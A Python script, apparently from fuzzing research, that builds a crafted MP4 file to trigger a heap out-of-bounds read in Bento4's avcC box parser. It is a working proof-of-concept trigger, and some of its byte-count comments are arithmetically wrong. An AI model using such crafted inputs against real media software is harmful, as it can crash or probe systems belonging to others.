#!/usr/bin/env python3
"""
VULN 001 PoC Generator
File   : Bento4/Source/C++/Core/Ap4AvccAtom.cpp
Func   : AP4_AvccAtom::Create()
Type   : CWE-125 OOB Heap Read
Trigger: avcC box with size=8 (zero-byte payload).
         payload_data is allocated for 0 bytes; payload[0] is read at line 75
         before the size-check at line 80.
"""

import struct
import os

POCDIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4AvccAtom_h"
OUTPUT = os.path.join(POCDIR, "vuln_001.mp4")


def box(t, data=b''):
    """Standard MP4 box: size(4 BE) + type(4 ASCII) + data."""
    return struct.pack('>I4s', 8 + len(data), t.encode('latin1')) + data


def full_box(t, version, flags, data=b''):
    """FullBox = box with version(1)+flags(3) prepended to data."""
    vf = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return box(t, vf + data)


# ── avcC box: size=8, NO payload ─────────────────────────────────────────────
# AP4_AvccAtom::Create(size=8, stream):
#   payload_size = 8 - 8 = 0
#   AP4_DataBuffer payload_data(0)  <- allocates 0 bytes
#   payload = payload_data.GetData()
#   if (payload[0] != 1) ...        <- OOB READ of 1 byte beyond heap allocation
avcc = box('avcC', b'')             # 8 bytes total

# ── avc1 sample entry (86 bytes total) ───────────────────────────────────────
avc1_fields = (
    b'\x00' * 6 +                               # reserved[6]
    struct.pack('>H', 1) +                       # data_ref_index = 1
    struct.pack('>HH', 0, 0) +                   # pre_defined, reserved
    b'\x00' * 12 +                               # pre_defined[3]
    struct.pack('>HH', 320, 240) +               # width, height
    struct.pack('>II', 0x00480000, 0x00480000) + # horiz_res, vert_res (72 dpi)
    struct.pack('>I', 0) +                       # reserved
    struct.pack('>H', 1) +                       # frame_count
    b'\x00' * 32 +                               # compressorname[32]
    struct.pack('>H', 0x0018) +                  # depth
    struct.pack('>h', -1)                        # pre_defined = -1
)
# avc1_fields: 6+2+2+2+12+2+2+4+4+4+2+32+2+2 = 70 bytes
avc1 = box('avc1', avc1_fields + avcc)           # 8 + 70 + 8 = 86 bytes

# ── stsd (FullBox manually) ───────────────────────────────────────────────────
# stsd = size(4) + 'stsd'(4) + version+flags(4) + entry_count(4) + avc1(86)
stsd = box('stsd',
    struct.pack('>II', 0, 1) +   # version+flags=0, entry_count=1
    avc1
)   # 8 + 4 + 4 + 86 = 102 bytes

stts = full_box('stts', 0, 0, struct.pack('>I', 0))      # 16 bytes
stsc = full_box('stsc', 0, 0, struct.pack('>I', 0))      # 16 bytes
stsz = full_box('stsz', 0, 0, struct.pack('>II', 0, 0))  # 20 bytes
stco = full_box('stco', 0, 0, struct.pack('>I', 0))      # 16 bytes

stbl = box('stbl', stsd + stts + stsc + stsz + stco)
# 8 + 102 + 16 + 16 + 20 + 16 = 178 bytes

# ── vmhd ─────────────────────────────────────────────────────────────────────
vmhd = full_box('vmhd', 0, 1,
    struct.pack('>H', 0) +   # graphicsMode
    b'\x00' * 6              # opcolor[3]
)   # 20 bytes

# ── dinf / dref / url_ ───────────────────────────────────────────────────────
url_ = full_box('url ', 0, 1)                                # 12 bytes (self-contained flag)
dref = full_box('dref', 0, 0, struct.pack('>I', 1) + url_)  # 28 bytes
dinf = box('dinf', dref)                                     # 36 bytes

minf = box('minf', vmhd + dinf + stbl)
# 8 + 20 + 36 + 178 = 242 bytes

# ── mdhd ─────────────────────────────────────────────────────────────────────
mdhd = full_box('mdhd', 0, 0,
    struct.pack('>IIII', 0, 0, 1000, 0) +  # creation, modification, timescale, duration
    struct.pack('>HH', 0, 0)               # language, pre_defined
)   # 32 bytes

# ── hdlr ─────────────────────────────────────────────────────────────────────
hdlr = full_box('hdlr', 0, 0,
    struct.pack('>I', 0) +  # pre_defined
    b'vide' +               # handler_type
    b'\x00' * 12 +          # reserved[3]
    b'\x00'                 # name (null terminator)
)   # 33 bytes

mdia = box('mdia', mdhd + hdlr + minf)
# 8 + 32 + 33 + 242 = 315 bytes

# ── tkhd ─────────────────────────────────────────────────────────────────────
identity = struct.pack('>IIIIIIIII',
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000
)  # 36 bytes

tkhd = full_box('tkhd', 0, 3,   # flags=3: enabled + in_movie
    struct.pack('>IIIII', 0, 0, 1, 0, 0) +  # creation, modification, track_ID, reserved, duration
    b'\x00' * 8 +                           # reserved[2]
    struct.pack('>hhhh', 0, 0, 0, 0) +      # layer, alternate_group, volume, reserved
    identity +                              # matrix[9]
    struct.pack('>II', 0, 0)                # width, height (16.16 fixed-point)
)   # 92 bytes

trak = box('trak', tkhd + mdia)
# 8 + 92 + 315 = 415 bytes

# ── mvhd ─────────────────────────────────────────────────────────────────────
mvhd = full_box('mvhd', 0, 0,
    struct.pack('>IIII', 0, 0, 1000, 0) +  # creation, modification, timescale, duration
    struct.pack('>I', 0x00010000) +         # rate = 1.0
    struct.pack('>H', 0x0100) +             # volume = 1.0
    b'\x00' * 10 +                         # reserved (2 + 8)
    identity +                             # matrix[9]
    b'\x00' * 24 +                         # pre_defined[6]
    struct.pack('>I', 2)                    # next_track_ID
)   # 108 bytes

moov = box('moov', mvhd + trak)
# 8 + 108 + 415 = 531 bytes

# ── ftyp ─────────────────────────────────────────────────────────────────────
ftyp = box('ftyp',
    b'isom' +              # major_brand
    struct.pack('>I', 0) + # minor_version
    b'isom'                # compatible_brands
)   # 8 + 12 = 20 bytes

# ── Assemble and write ────────────────────────────────────────────────────────
mp4 = ftyp + moov

os.makedirs(POCDIR, exist_ok=True)
with open(OUTPUT, 'wb') as f:
    f.write(mp4)

total = len(mp4)
print(f"[+] vuln_001.mp4 written: {total} bytes")
print(f"    ftyp={len(ftyp)}  moov={len(moov)}  "
      f"(mvhd={len(mvhd)} trak={len(trak)} mdia={len(mdia)} "
      f"minf={len(minf)} stbl={len(stbl)} stsd={len(stsd)} avc1={len(avc1)} avcc={len(avcc)})")
print(f"[+] avcC payload_size = 0 -> OOB read triggered at payload[0] in AP4_AvccAtom::Create()")
